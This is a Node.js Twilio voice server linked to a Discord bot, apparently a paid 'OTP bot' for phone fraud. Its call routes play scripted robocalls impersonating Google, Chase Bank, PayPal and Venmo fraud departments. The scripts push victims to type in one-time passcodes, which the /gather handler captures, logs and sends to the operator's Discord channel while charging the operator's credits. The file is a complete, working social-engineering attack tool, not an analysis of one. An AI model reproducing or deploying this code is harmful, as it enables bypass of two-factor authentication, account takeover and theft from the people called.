require("dotenv").config()
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const express = require('express');
const app = express();
const urlencoded = require('body-parser').urlencoded;
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const tc = require('twilio')(accountSid, authToken);
const ev = require('./caller').ev
const atob = require('atob')
const bot = require("./bot/src/index").bot
const { MessageEmbed } = require("discord.js")

// Parse incoming POST params with Express middleware
app.use(urlencoded({ extended: false }));

app.post('/coinbase', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();

    // Use the <Gather> verb to collect user input
    const gather = twiml.gather({
        action: '/gather',
        method: 'POST',
        input: 'dtmf',
        numDigits: 6,
    });


      gather.say('Hi, Gabriel Pierce').break_({strength: 'x-weak',time: '100ms'});
    gather.say("Automated Alert from Google.com. We have got a request to completely disable your Google Authenticator from your device iPhone SE, and we believe to be fraudulent. Please provide the one time passcode, we just sent you in the dialpad to cancel this request, please note, we will proceed to completely disable your Google Authenticator application, if we are not able to confirm your identity").break_({strength: 'x-weak',time: '2000ms'});
    gather.say('I did not receive any response, please press 1 to cancel or listen again.\n\n').break_({strength: 'x-weak',time: '5000ms'});
    gather.say("Automated Alert from Google.com. We have got a request to completely disable your Google Authenticator from your device iPhone SE, and we believe to be fraudulent. Please provide the one time passcode, we just sent you in the dialpad to cancel this request, please note, we will proceed to completely disable your Google Authenticator application, if we are not able to confirm your identity").break_({strength: 'x-weak',time: '3000ms'});
    gather.say('I did not receive any response\n\n').break_({strength: 'x-weak',time: '5000ms'});

    // gather.say('Hi, ').break_({strength: 'x-weak',time: '100ms'});
    // gather.say("Automated Alert from coinbase. Your account has sent 250 dollar to an in-secure wallet address and we believe to be fraudulent. Please provide the one time passcode we just sent you in the dialpad.").break_({strength: 'x-weak',time: '2000ms'});
    // gather.say('I did not receive any response, please press 1 to cancel or listen again.\n\n').break_({strength: 'x-weak',time: '5000ms'});
    // gather.say("Automated Alert from coinbase. Your account has sent 250 dollar to an in-secure wallet address and we believe to be fraudulent. Please provide the one time passcode we just sent you in the dialpad.").break_({strength: 'x-weak',time: '3000ms'});
    // gather.say('I did not receive any response\n\n').break_({strength: 'x-weak',time: '5000ms'});
    response.type('text/xml');
    response.send(twiml.toString());
});



app.post('/chase', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();

    // Use the <Gather> verb to collect user input
    const gather = twiml.gather({
        action: '/gather',
        method: 'POST',
        input: 'dtmf',
        numDigits: 6,
    });

    gather.say('Hi, Welcome to Chase Bank services').break_({strength: 'x-weak',time: '100ms'});
    gather.say('Please note this call will be monitored and recorded for quality assurance purposes.\n\n').break_({strength: 'x-weak',time: '3000ms'});
    gather.say("This is a automated call from Chase Bank fraud department, You recently sent a payment for 550 Dollars to John Cramer, and we believe it is a fraudulent transfer, We have sent you a code, Please enter it in the dial pad To confirm your identity to cancel the payment.").break_({strength: 'x-weak',time: '6000ms'});
    gather.say('I did not receive any response, please listen again.\n\n').break_({strength: 'x-weak',time: '2000ms'});
    gather.say("This is a automated call from Chase Bank fraud department, You recently sent a payment for 550 Dollars to John Cramer, and we believe it is a fraudulent transfer, We have sent you a code, Please enter it in the dial pad To confirm your identity to cancel the payment.").break_({strength: 'x-weak',time: '6000ms'});
    gather.say('I did not receive any response\n\n').break_({strength: 'x-weak',time: '8000ms'});

    response.type('text/xml');
    response.send(twiml.toString());
});



// Create a route that will handle Twilio webhook requests, sent as an
// HTTP POST to /voice in our application
app.post('/voice', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();
    
    // Use the <Gather> verb to collect user input
        const gather = twiml.gather({
            action: '/gather',
            method: 'POST',
            input: 'dtmf',
            numDigits: 6,
        });
        gather.say("Automated Alert From PayPal. Your account has been compromised. We have sent you a one time code to verify your identity. Please provide the code to this number with the dialpad.");

    response.type('text/xml');
    response.send(twiml.toString());
});

app.post('/venmo', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response
    const twiml = new VoiceResponse();
    
    // Use the <Gather> verb to collect user input
        const gather = twiml.gather({
            action: '/gather',
            method: 'POST',
            input: 'dtmf',
            numDigits: 6,
        });
        gather.say("This is a automated call from Venmo, You recently sent a payment for 550 Dollars to John Cramer, and we believe it is a fraudulent transfer, We have sent you a code, Please enter it in the dial pad To confirm your identity to cancel the payment")
        
    response.type('text/xml');
    response.send(twiml.toString());
});

app.post('/gather', (request, response) => {

    const twiml = new VoiceResponse();
    var countEntered = 0;
    if (request.body.Digits) {
        console.log("Acquired Code: " + request.body.Digits)
        
        var obj = bot.calls.get(bot.idtosid.get(bot.abchannel).sid)
        obj.code = request.body.Digits
        bot.calls.set(bot.idtosid.get(bot.abchannel), obj)
        bot.chs.get(bot.idtosid.get(bot.abchannel).sid).send(`Your code is: **${request.body.Digits}**`)

        if (countEntered >= 1) {
            twiml.say("YOUR ACCOUNT HAS NOW BEEN SUCCESSFULLY VERIFIED")
            twiml.hangup()
        }else{
           
           twiml.say("I did not get that, please enter the code again using your phone dialpad").break_({strength: 'x-weak',time: '8000ms'});
           countEntered++;
        }
        
        
        var db = new bot.db.table("credits")
        var creds = db.has(obj.id)
        if(creds > 1) {
            db.set(obj.id, Math.floor(creds - 1))
        } else {
            db.set(obj.id, 0)
        }
        bot.abchlog.send(`${obj.si}`, {
            embed: new MessageEmbed()
                .setTitle(`New OTP call.`)
                .addField("To:", bot.users.cache.get(obj.id), true)
                .addField("From:", obj.ca.from, true)
                .addField("Code:", request.body.Digits, true)
                .addField("Instantiater:", bot.users.cache.get(obj.id))
            })
    } else {
        bot.calls.get(bot.idtosid.get(bot.abchannel).sid).send(`Your code was not entered :(`)
        return;
    }

    response.type('text/xml');
    response.send(twiml.toString());
});


app.post('/status', (request, response) => {
    // Use the Twilio Node.js SDK to build an XML response

      var sid = request.body.CallSid;
      var timeX = 0;
      if(sid){

      tc.calls(sid)
        .fetch()
        .then((items) => {
            var timeX = items.duration;
          return bot.abchlog.send(`
           ${items.status ===  `failed` ? `⚠` : items.status ===  `completed` ? `✅` : `♺` } Status: **${items.status}** \n ${items.status ===  `in-progress` ? 'Action: Please send code now\n' : ''} ✆ To: ${items.to} \n ☎ Duration: ${items.duration} \n 
         `)
         
         });
      



                


 }
       
  

       

 
});



console.log('Twilio Client app HTTP server running at http://127.0.0.1:3000');
app.listen(3000);